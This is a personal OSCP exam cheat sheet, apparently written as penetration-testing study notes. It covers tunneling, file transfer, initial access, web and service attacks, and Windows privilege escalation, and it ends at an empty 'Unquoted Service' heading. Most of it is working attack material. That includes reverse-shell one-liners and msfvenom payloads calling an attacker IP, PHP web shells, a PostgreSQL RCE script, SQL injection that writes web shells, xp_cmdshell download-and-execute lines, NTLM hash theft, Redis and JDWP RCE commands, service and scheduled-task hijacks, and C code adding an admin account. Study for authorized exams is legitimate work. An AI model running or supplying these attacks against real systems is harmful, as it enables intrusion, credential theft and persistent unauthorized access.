Author: Xinyue   
This version is suitable for the OSCP exam before the update.

# Tunnel

>  https://github.com/nicocha30/ligolo-ng
> 

```jsx
//kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:9001
ligolo-ng >> session
ligolo-ng >> start

//win
./agent.exe -connect 192.168.1.1:9001 -ignore-cert
//linux
./agent -connect 192.168.1.1:9001 -ignore-cert

//access internal network
ligolo-ng >> ifconfig
in another terminal : $ sudo ip route add 172.16.1.0/24 dev ligolo

//access localhost
sudo ip route add 240.0.0.1/32 dev ligolo
nmap 240.0.0.1 -sV

//create additional listener
[Agent : FAKE\web_svc@Target1] » listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4445 --tcp
nc -nlvp 4445 //connect
python3 -m http.server 4445 //transfer file
```

ssh

```jsx
systemctl start ssh
//3307 on remote to 3306 kali
ssh -N -R 127.0.0.1:3307:127.0.0.1:3306 kali@192.168.1.1
ssh -N -R 9998 kali@192.168.1.1
// forwards all traffic on port 7777 on the remote server to port 7777 on the local machine (127.0.0.1).
ssh web_svc@192.168.1.1 -D 9090 -R *:7777:127.0.0.1:7777
```

http

```jsx
./chisel server -p 8000 --reverse #kali
.\\chisel.exe client 192.168.1.1:8000 R:8090:localhost:80 #windows
```

# File Transfer

Kali ⇒ Any

```jsx
python3 -m http.server 80

php -S 0.0.0.0

impacket-smbserver test . -smb2support #kali
copy-item \\192.168.1.1\test\nc.exe .  #win
```

Win ⇒ Kali

```jsx
impacket-smbserver test . -smb2support //kali
copy-item .\Database.kdbx \\192.168.1.1\test\  //powershell
copy .\Database.kdbx \\192.168.1.1\test\  //cmd
```

Linux ⇒ kali

```jsx
Sender: nc -w 3 10.10.10.1 4444 < file1 
Receiver: nc -nlvp 4444 > file1
```

evil-winrm

```jsx
upload  /home/kali/Desktop/tools/privilegeEscalation/win/winpeas/winPEASx64.exe C:\Users\Public
download file .
```

ssh

```jsx
#upload
scp -i id_rsa linpeas.sh dave@192.168.1.1:/dev/shm/
#download
scp -r -i id_rsa dave@192.168.1.1:/dev/shm/out.txt .
```

# **Initial Access**

## Shell


### SuperShell - Shell Management Tool

sudo source config.sh  →access via IP:8888

```jsx
#!/bin/bash

IP_ADDRESS=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)

export EXTERNAL_ADDRESS=$IP_ADDRESS
cd /home/kali/Desktop/Supershell && docker-compose up -d --no-build
```

### Reverse Shell / Bind Shell

connect to SuperShell

```jsx
//cmd
certutil -urlcache -split -f http://192.168.1.1:8888/supershell/compile/download/rs.exe C:\Users\Public\rs1.exe & C:\Users\Public\rs1.exe
curl http://192.168.1.1:8888/supershell/compile/download/rs.exe -o rs.exe & rs.exe

//powershell
iwr -uri http://192.168.1.1:8888/supershell/compile/download/rs.exe -Outfile C:\Users\Public\rs.exe ; C:\Users\Public\rs.exe

//bash
wget http://192.168.1.1:8888/supershell/compile/download/rs -O rs; chmod 777 rs; ./rs

```

PHP

```php
//simple shell
<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
<?php echo system($_GET['cmd']);?>

//reverse
all OS: rs.pHp Ivan Sincek https://www.revshells.com/
```

Upgrade simple shell

```jsx
?cmd = nc 192.168.1.1 80 -e /bin/sh
?cmd = wget http://192.168.1.1/reverseShell.php
?cmd = php reverseShell.php
?cmd = php7 rv1.php
http://192.168.1.1/reverseShell.php
```

Ruby

```jsx
echo 'exec "/bin/bash"' > app.rb
```

Windows

```jsx
https://www.revshells.com/ - Powershell#3base64
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 EXITFUNC=thread -f exe --platform windows -o rs.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 EXITFUNC=thread -f exe --platform windows -o rs.exe
```

Linux

```jsx
/bin/sh -i >& /dev/tcp/192.168.1.1/4444 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.1 4444 >/tmp/f
nc 192.168.1.1 8080 -e /bin/bash
busybox nc 192.168.1.1 8080 -e /bin/bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 --platform Linux -f elf -o rs.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -a x64 --platform Linux -f elf -o rs.elf
```

JAVA

```jsx
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f war > shell.war
```

PostgreSQL

- https://raw.githubusercontent.com/squid22/PostgreSQL_RCE/main/postgresql_rce.py
    
```jsx
#!/usr/bin/env python3
import psycopg2

RHOST = '192.168.56.47'
RPORT = 5437
LHOST = '192.168.49.56'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'

with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
    try:
        cur = conn.cursor()
        print("[!] Connected to the PostgreSQL database")
        rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
        cur.execute('DROP TABLE IF EXISTS cmd_exec')
        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
        cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
        cur.execute('SELEC * from cmd_exec')
        v = cur.fetchone()
        #print(v)
        cur.close()

    except:
        print(f"[!] Something went wrong")
```
    

ASP.NET

- virtual host routing ⇒ access via domain configured in /etc/hosts

```jsx
//reverse shell
https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f aspx > shell_443.aspx
```

Writable Path

```jsx
C:/Users/Public
C:/Windows/Temp
/dev/shm
/tmp

windows: C:\ => mkdir tmp
```

### TTY shell

```jsx
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])'
ctrl+Z and stty raw -echo ; fg

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

### Meterpreter shell

```jsx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443  EXITFUNC=thread  -f python

//start meterperter
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 443
run

[*] Started reverse TCP handler on 192.168.1.1:443 
[*] Sending stage (176198 bytes) to 192.168.243.40
[*] Meterpreter session 3 opened (192.168.1.1:443 -> 192.168.243.40:49159) at 2024-06-22 21:22:14 -0400

meterpreter > shell
```

### Remote Access

remote desktop / rdp

```jsx
//xfreerdp require password
xfreerdp /u:administrator /p:lab /v:192.168.1.1  +clipboard +drive:share,/tmp

rdesktop 192.168.1.1
rdesktop 192.168.1.1 -u Administrator -p password -g 80%

//open remote desktop 
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 
```

LANDesk remote management

```jsx
telnet 172.16.1.1 2323
```

winrm

```jsx
evil-winrm -i 192.168.1.1 -u admin -p "password\!"
evil-winrm -i 10.10.1.2 -u admin -H e72ce72ce72ce72ce72ce72ce72c
```

ssh

```jsx
ssh -i id_rsa dave@172.16.1.1
```

Sql

```jsx
//postgreSQL
psql -h 192.168.1.1 -p 5432 -U testuse

//mssql
sqsh -S 240.0.0.1:1434 -U admin -P passowrd -D dave 
1> select 1;
2> go

impacket-mssqlclient Administrator:password@192.168.1.1 -windows-auth
```

### Only connect back via specific port

```jsx
//check local port
netstat -nlptu

//test TCP connection
nc 192.168.1.1 4444
nc -nlvp 4444

//output error to tmp file if no feedback in terminal
nc 192.168.1.1 21 2>/tmp/error
cat /tmp/error

//if +x doesn't work
chmod 777 rs

//generate reverse shell on specific port and use local port forwarding
socat -ddd tcp-listen:21,fork tcp:192.168.1.1:3232
```

### Persistence

Linux

```jsx
ssh-keygen -t rsa
cp ~/.ssh/id_rsa.pub authorized_keys
chmod 600 id_rsa
upload authorized_keys to taget user/.ssh
chmod 600 authorized_keys
```

### Test connection via PING

```jsx
sudo tcpdump -i tun0 icmp -v

wireshark
```

## Web


### Framework & language

```jsx
Wappalyzer
whatweb http://192.168.1.1:50000
try clicking each bottom on webpage
```

check version

```jsx
search version in source page
click ? icon
```

### Virtual Host Routing

Test invalid url. HTTP Error 400. The request hostname is invalid.

```jsx
//Got hostname from nmap
https://Target1.fake:8443/
```

More Info after adding hostname to /etc/hosts

> https://youtube.com/watch?v=NMGsnPSm8iw
> 

```jsx
//Got hostname from webpage
http://192.168.1.1:24680
http://fake.com:24680
```

### **Directory Scan**

```jsx
feroxbuster --url http://192.168.1.1:8090 -x pdf js html php txt json asp aspx jsp -v -k -n -e -C 404 -t 100
feroxbuster -u http://192.168.1.1:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js html php txt json asp aspx jsp -v -k -n -e -C 404 -t 30
dirsearch --url http://192.168.1.1:8090 -r
dirsearch -u http://192.168.1.1:8080 --cookie="session=eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.ZmT3fQ.SuPMGLUIXOE2p-G6wS1n-uvOLw8" -x 404
gobuster dir -u http://192.168.1.1:8090 -w /usr/share/wordlists/dirb/small.txt -t 150
gobuster dir -u http://192.168.1.1:8090/backend -w /usr/share/wordlists/dirb/common.txt -t 150

gobuster dir -u http://192.168.1.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,html,txt -t 90
--exclude-length 216
-b 400, 403, 404

nikto -h http://192.168.1.1:8000


DONT SKIP
/api

```

.git

```jsx
/.git/logs/HEAD  //important modification
wget -r url/.git
//https://github.com/internetwache/GitTools
./gitdumper.sh https://worklms.helium.ctfio.com/.git/ ./website 
git-dumper http://website.com/.git ~/website
git diff
git log
git log -p
git branch --list
//check deleted file
git show 80ad5fe45438bbbbbbbbbbbbbbbbbbbbb
```

### Header

PUT allowed & Webdav enabled

```jsx
80/tcp    open  http          Microsoft IIS httpd 10.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown

HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
WWW-Authenticate: Basic realm="192.168.1.1"
```

RCE https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav

```jsx
cadaver 192.168.1.1 //require username:password
>mput rv.aspx .

URL/rv.aspx
```

### CMS

identify service

```jsx
whatweb http://192.168.1.1:81
searchsploit framework/webpage **title**/system name
```

Wordpress

```jsx
wpscan --url 192.168.1.1 -e p --plugins-detection aggressive
```

### **Login Panel**

Password

```jsx
//weak password
admin:admin
administrator:administrator

//password bypass - Mysql
admin' OR 1=1--
'OR '' = '	Allows authentication without a valid username.
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/sqli.auth.bypass.txt

//default credentials
cd /usr/share/seclists
grep -r  "Sonatype Nexus"

hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.1.1 ftp

Invalid password means username is right
```

MSSQL injection to RCE

```jsx
//impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
' EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -
' EXEC xp_cmdshell 'certutil -urlcache -split -f <http://192.168.1.1:8888/supershell/compile/download/test_1.exe> C:\\Windows\\Temp\\test_1.exe & C:\\Windows\\Temp\\test_1.exe'; -- -
```

MYSQL upload webshell

```jsx
//error-based 
' order by 3 #
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- -
//not error-based
'+UNION+SELECT+sleep(5);+--+- 
' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php'; -- 
%27+UNION+SELECT+%27%3C%3Fphp+echo+exec%28%24_GET%5B%22cmd%22%5D%29%3B%27+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B+--

Outputfile: phpinfo => DOCUMENT_ROOT


delete \n in tail
try different url encode method if error 400
https://www.urlencoder.org/

```

SQL  Injection Payload

```jsx
https://github.com/payloadbox/sql-injection-payload-list
https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi
```

password bruteforce

```jsx
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-get
```

source code

password forget page

Modify return status of email confirmation

```jsx
Add `user%5Bconfirmed%5D=True` in Post Request to see if we can modify response value

{"email":"admin@sm.com","id":2,"username":"admin3","confirmed":false,"created_at":"2024-06-27T22:53:29.663Z","updated_at":"2024-06-27T22:53:29.663Z"}

```

### File Upload Bypass

> https://book.hacktricks.xyz/pentesting-web/file-upload
> 

file signature

```jsx
//hexeditor or plaintext
https://en.wikipedia.org/wiki/List_of_file_signatures

//rs.php for PDF bypass

%PDF-
<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>

```

Content-Type

```jsx
//ony accept gif
Content-Type: image/gif
```

PHP extension

```jsx
Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
```

.htaccess bypass

```jsx
echo 'AddType application/x-httpd-php .dork' > .htaccess
//upload .htaccess
//upload rv.dork
```

ODT file & stealing NTLM via responder

> https://www.exploit-db.com/exploits/44564
> 

```jsx
pip install lxml
pip install ezodf
python 44564.py 
sudo responder -I tun0
hashcat -m 5600 crack /usr/share/wordlists/rockyou.txt --force
```

### File Inclusion (FI) / Directory Traversal (DT)

example

```php
http://192.168.1.1:8000/backend/?view=user.inc
http://192.168.1.1:4443/site/index.php?page=main.php
```

Local File Inclusion (LFI)

```jsx
C:\Windows\System32\drivers\etc\hosts
filename=..\..\..\windows\win.ini
http://192.168.1.1:8000/backend/?view=../../../../etc/passwd
//separate to two parameters
?cwd=../../../../../../../../../etc&file=passwd&download=false 

//common files for python app
main.py
app.py
api.py 
/proc/self/environ
/proc/self/cmdline

//LFI & file upload
upload authorized_keys to target
```

Remote File Inclusion (RFI)

```php
http://192.168.1.3:4443/site/index.php?page=http://192.168.1.1/rs.php
<?php
passthru("powershell -e JABjAGwAaQBlAG4AdAA...");
?>
```

Base64 encode required

```jsx
X-Error: Incorrect padding
/data/Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
```

Vulnerable Platforms

```jsx
apache 2.4.49
Werkzeug/1.0.1
RESPONSIVE filemanager v.9.13.4
```

Web root

```jsx
/var/www/html
/var/www
```

### SSRF / Controllable URL

Net-NTLMv2 authenticate: try both smb and http

```jsx
name=asdd&mail=asd%40asd.cdcc&url=\\\\192.168.1.1\share
http://192.168.180.1:8080/?url=http://192.168.1.1
sudo responder -I tun0
hashcat -m 5600 crack /usr/share/wordlists/rockyou.txt --force //whole hash string
```

### Info Leakage

translate different language to english

```jsx
//domain name
market@fake.jp
```

phpinfo.php

```jsx
$_SERVER['DOCUMENT_ROOT']	/srv/http
USER 	root 
```

### Command Injection

```jsx
//?email=|+id
|id
||id
%0Aid
'|id
'||id
'%0Aid
"|id
"||id
"%0Aid
```

### Downloads

source code

```jsx
check password 
check hidden url => SQL Injection
```

### Post

```jsx
curl –X post –-data “code=2*2” http://192.168.1.1:50000/verify

//in burpsuite add 
Content-Type: application/x-www-form-urlencoded
```

## Service


### Port Scan

```jsx
sudo nmap -Pn -n 192.168.1.1 -sCV -p- --open -oN scan.txt

sudo nmap -p- --min-rate 1000 192.168.1.1 -oN ports.txt -Pn 
cat ports.txt | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//'
sudo nmap -p 80 -sC -sV -A -Pn --min-rate 1000 192.168.1.1 
sudo nmap -F -sU 192.168.1.1 --min-rate 1000 --top-ports=100 --script=*enum

sudo env "PATH=$PATH" autorecon <IP>
```

### 21 - FTP

anonymous login

```jsx
anonymous : anonymous
anonymous :
ftp : ftp
```

Download files

```jsx
ftp>prompt off
ftp>mget * .
//recursive download
wget -r ftp://192.168.1.1:24621/  --ftp-user=ftp_jp --ftp-password=~p\<Ass:0rd
```

File upload ⇒ access path then RCE

```jsx
ftp> put rs.aspx
```

229 Entering Extended Passive Mode (|||50928|)

```jsx
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.

```

Unzip encrypted file

```jsx
7z x backup.zip
```

Get info from downloaded pdf

```jsx
exiftool -a -u *.pdf

//encrypted pdf
pdf2john Document.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
//show cracked password
john pdf.hash --show
```

.pcap

```jsx
http.request.method == "POST"
http.request.uri contains "/console"
wireshark: follow -> TCP stream
```

### 22 - SSH

bruteforce

```jsx
hydra -l offsec -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh -V
//crack ssh passphrase
ssh2john id_rsa > ssh.hash
john --wordlist=ssh.passwords ssh.hash
```

fuzz `ssh` directory 

```jsx
Windows: `C:/Users/Viewer/Desktop/.ssh/id_rsa`
Linux: `/home/Viewer/.ssh/id_rsa`

$ ssh -i id_rsa Viewer@<IP>
```

[SSH Key BruteForce List](https://github.com/xxxinhy/BruteforceList/blob/main/ssh-key-bruteforce-list.txt)

Enable IdentityOnly - If too many keys in .ssh folder

```jsx
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures

ssh -i ~/.ssh/keys/root root@127.0.0.1 -o IdentitiesOnly=yes
```

### 53 - DNS

```jsx
dig @192.168.1.1 AXFR fake.com
dnsenum 192.168.1.1
```

### 79 - finger

Morris Worm - fingerd Stack Buffer Overflow (Metasploit) 

```jsx
msfconsole
use bsd/finger/morris_fingerd_bof
```

### 110 - POP3

get credentials from webpage eg. employee’s introduction, photo link

```jsx
nc 192.168.1.1 110
user dave
pass xx
list
retr 1
```

### **135, 593, >40000 - MSRPC**

```jsx
rpcclient -U '' -N 192.168.1.1
rpcdump.py 192.168.1.1
```

### 139,445 - SMB

```jsx
smbclient -N -L \\\\192.168.1.1
smbclient \\\\192.168.1.1\\setup
smb: \> get file.txt

nxc smb 192.168.1.1 -u guest -p "" --rid-brute  #DC
smbmap -u guest -p "" -d . -H 

enum4linux -a 192.168.1.1
nmap --script vuln -p 139,445 $target -Pn -sCV


OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
CVE-2009-3103


smbclient -U fake.com/dave  -L 172.16.1.1
smbmap -u dave -H 192.168.1.1 -r
crackmapexec  smb 192.168.1.1 --shares
nxc  smb 172.16.1.1 -u 'user' -p 'pass' --shares
nxc  smb 172.16.1.1 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True

nmap --script "safe or smb-enum-*" -p 445 192.168.1.1
```

Download all

```jsx
smbclient -U '%' \\\\192.168.1.1\\dave
> mask ""
> recurse on
> prompt off
> cd 'path\to\remote\dir'
> lcd '~/path/to/download/to/'
> mget *
```

Writable SMB Share - upload script to force nltm authenticate

> https://github.com/Greenwolf/ntlm_theft
> 

```jsx
//enum username
nxc smb 192.168.1.1 -u guest -p "" --rid-brute
//force authenticate for Nltm
sudo responder -I tun0
python3 ntlm_theft.py -g lnk -s 192.168.1.1 -f file
smb: > mput file.lnk

//file.lnk

[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.1.1\%USERNAME%.icon
IconIndex=1

//crack
hashcat -m 5600 crack.hash /usr/share/wordlists/rockyou.txt --force
```

### 161 - SNMP (UDP Scan)

```jsx
sudo nmap --script snmp-* -sU -p161 192.168.1.1
sudo nmap -sU -p 161 --script snmp-brute $IP --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt

sudo apt-get install snmp-mibs-downloader
sudo download-mibs
snmpwalk -c public -v1 192.168.1.1
snmpwalk -c public -v1 192.168.1.1 1.3.6.1.4.1.77.1.2.25 #user
snmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2 #process
snmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.25.6.3.1.2 #installed software version
snmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.6.13.1.3 #list TCP ports
snmpwalk -c public -v1 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -c public -v1 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendOutputFull

//brute force community string
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
```

RCE

> https://github.com/mxrch/snmp-shell
> 

### 389 - LDAP

```jsx
//anonymous ldap
nxc ldap 192.168.1.1 -u "" -p "" -M get-desc-users // -L check all available modules

ldapsearch -x -H ldap://192.168.1.1 -b "dc=hutch,dc=offsec" > ldap.txt 
//list users
cat ldap.txt | grep -i "samaccountname" 
cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
//list description => password in plaintext
cat ldap.txt | grep -i "description" 

nxc ldap 192.168.1.1 -u ""  -p "" --users

nmap -sV --script "ldap* and not brute" $IP
```

### 1433 MSSQL

rce

```jsx
SQL (FAKE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

[*] INFO(Target2\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(Target2\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (FAKE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQ...';
```
LigoloNG: Add tunnel bridge if mssql can only access internal machine


```jsx
[Agent : OSCP\web_svc@Target1] » listener_add --addr 0.0.0.0:8082 --to 0.0.0.0:8081 --tcp
//transfer file
python3 -m http.server 8081 #klai
iwr -uri http://10.10.185.147:8082/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe 
```

### 2323 LANDesk remote management

```jsx
telnet 172.16.221.31 2323
login:root
```

### 3000 Aerospike

### 3128 - Squid

```jsx
//add following line to /etc/proxychains4.conf
http 192.168.1.1 3128 ext_acc Passw0rd!

proxychains nmap -sT -Pn 172.16.231.31  --min-rate 500
foxyproxy extension for firefox
```

### 3387 - Alternative port for Rdp

```jsx
xfreerdp cpub-QuickSessionCollection-CmsRdsh.rdp  /u:dave /p:password123 /d:fake.com /v:192.168.1.1
```

### 5985 - Winrm

### 6379 - Redis

4.x / 5.x RCE without username and password(tested on 5.0.9)

> https://github.com/vulhub/redis-rogue-getshell
> 

> https://www.rapid7.com/db/modules/exploit/linux/redis/redis_unauth_exec/ (metasploit)
> 

```jsx
cd ./RedisModulesSDK && make
python3 redis-master.py -r 192.168.243.1 -p 6379 -L 192.168.45.1 -P 6379 -f RedisModulesSDK/exp.so -c "busybox nc 192.168.1.1 8080 -e /bin/sh"
```

If we have username, we can get user's ssh path with command `config get dir` and set dir to ssh directory

```jsx
$ ssh-keygen -t rsa
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > pub.txt
$ cat pub.txt | redis-cli -h <IP> -x set ssh_key
$ redis-cli -h <IP>
> config set dir /var/lib/redis/.ssh
OK
> config set dbfilename "authorized_keys"
OK
> save
OK
```

### 8000 - JDWP

> https://github.com/hugsy/jdwp-shellifier
> 

```jsx
./jdwp.py -t 192.168.1.1 -p 8000   --cmd 'busybox nc 192.168.1.1 8080 -e /bin/bash' 
 nc 192.168.206.1 5000 -z 
```

### 8021 - FreeSWITCH

```jsx
https://www.exploit-db.com/exploits/47799
```

### >10000 (intentional)

JAMES Remote Admin 2.3.2

```jsx
https://www.exploit-db.com/exploits/35513
payload = '/bin/bash -i >& /dev/tcp/192.168.45.201/4444 0>&1'
```

### **11211 -** Memcached

Memcached 1.4.33 RCE exploit 

```jsx
//https://github.com/CarlosG13/CVE-2021-33026
python3 poc.py --rhost 192.168.185.1 --rport 5000 --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 80 >/tmp/f" --cookie "session:650469fb-98ab-4dc5-ad58-00a40eb6658c"
```

### 65432 - rpc.py

rpc.py in /opt

```jsx
https://www.exploit-db.com/exploits/50983
```

### Unknown

grab banner

```jsx
nc <ip> <port>
```

# Privilege Escalation

## **Windows**


### AutoScan

```php
.\winPeas.exe log
cat out.txt | less -r

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
```

### Basic Info

```jsx
whoami 
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
C:\Windows\System32\whoami.exe
systeminfo
whoami /groups
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember admin
net user admin
ipconfig /all
netstat -ano
Get-Process
(get-process -Id 2308).path //get binary path
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### Switch shell

```jsx
%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe
```

### Installed program

```jsx
ls 'C:\Program Files (x86)'
PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation //https://www.exploit-db.com/exploits/49382
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe C:\Windows\Temp\exploit.ps1
```

### Old OS Version

MS11-046: <Windows Server 2008 sp1 x86

```jsx
https://www.exploit-db.com/exploits/40564 #compiled on linux
```

### Local Service

```jsx
check service running on 127.0.0.1 or second network interface 10.10.191.254
TCP        10.10.191.254         40000        powershell

net start
wmic service list brief
sc query
Get-Service

cmd /c sc qc mysql #check ownership
sc.exe qc MySQL
```

### Scheduled Tasks

```jsx
schtasks /query /fo LIST /v > schtasks.txt
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
Get-ScheduledTask -TaskName "Task Name" -ErrorAction SilentlyContinue
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
iwr -Uri http://192.168.119.3/rs.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

Escalate from admin to system

```jsx
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "C:\Users\Adrian\rs.exe"
schtasks /Create /RU "SYSTEM" /SC MINUTE /TN "SchedPE" /TR "C:\Users\Adrian\rs.exe"
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c certutil.exe -urlcache -split -f http://192.168.45.182:8888/supershell/compile/download/test_182.exe C:\Windows\Temp\test_158.exe & C:\Windows\Temp\test_158.exe
```

### Service Binary Hijacking

```jsx
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\apache\bin\httpd.exe"
whoami /group
iwr -uri http://192.168.119.3/rs.exe -Outfile rs.exe
move-item C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move-item .\rs.exe C:\xampp\mysql\bin\mysqld.exe

//start mode
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
shutdown /r /t 0 #SeShutDownPrivilege => reboot

//powerUp.ps1
import-module .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles

//check auto_start
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
Get-Service service#service list
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto"

stop-service service
start-service service
cmd /c sc qc GPGOrchestrator #check service detail
cmd /c sc start auditTracker
//c:\windows\system32\sc.exe 

C:\DevelopmentExecutables>sc qc auditTracker

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: auditTracker
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\DevelopmentExecutables\auditTracker.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : auditTracker
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

sc start auditTracker

```

Add User

```jsx

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
Get-LocalGroupMember administrators
```

### Unquoted Service

```jsx
